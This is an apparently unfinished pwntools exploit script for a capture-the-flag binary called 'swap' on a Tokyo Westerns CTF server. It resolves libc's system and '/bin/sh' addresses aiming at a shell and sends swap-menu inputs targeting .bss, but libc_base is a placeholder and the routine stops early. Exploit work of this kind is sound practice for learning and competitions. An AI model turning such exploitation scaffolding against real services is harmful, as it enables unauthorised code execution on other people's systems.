from pwn import *

# ==============================
# TODO:TEMPLATE FOR EXPLOITATION
# ==============================
context(os='linux', arch='i686')
context.log_level = 'debug' # output verbose log
FILE_NAME = './swap'
binary = ELF(FILE_NAME)
LOCAL_HOST = 'localhost'
LOCAL_PORT = 4444
REMOTE_HOST = 'pwn1.chal.ctf.westerns.tokyo'
REMOTE_PORT = 19937
REMOTE_LIBC = './libc.so.6-swap'
LOCAL_LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
conn = None
dflg = 0
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    conn = remote(REMOTE_HOST, REMOTE_PORT)
    libc = ELF(REMOTE_LIBC)
elif len(sys.argv) > 1 and sys.argv[1] == "l":
    conn = process(FILE_NAME)
    libc = ELF(LOCAL_LIBC)
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    dflg = 1
else:
    conn = remote(LOCAL_HOST, LOCAL_PORT)
    libc = ELF(LOCAL_LIBC)

if len(sys.argv) > 2 and sys.argv[2] == 'd':
    dflg = 1

def start():
    log.info('Pwning')
    if(dflg == 1):
        raw_input('attach...')
    time.sleep(5)
    recvn()

def send(x):
    conn.sendline(x)

def recv(x):
    conn.readuntil(x)

def recvn(x=4096):
    conn.read(x)


# ==================================
# PREPARING FOR EXPLOITATION ROUTINE
# ==================================
libc_system = libc.symbols['system']
plt_read = binary.plt['read']
got_offset_read = 0x28
libc_binsh = next(libc.search('/bin/sh'))
addr_bss = binary.bss()
libc_base = 0x77777777
# ----------------------------------
def pattern1(x, y):
    send('1')
    recvn()
    send(str(x))
    recvn()
    send(str(y))
    recvn()

def pattern2():
    send('2')
    recvn()

def pattern0():
    send('0')
    recvn()


# =========================
# MAIN EXPLOITATION ROUTINE
# =========================
start()
pattern1(addr_bss+0x800, addr_bss+0x900)
pattern2()
pattern0()

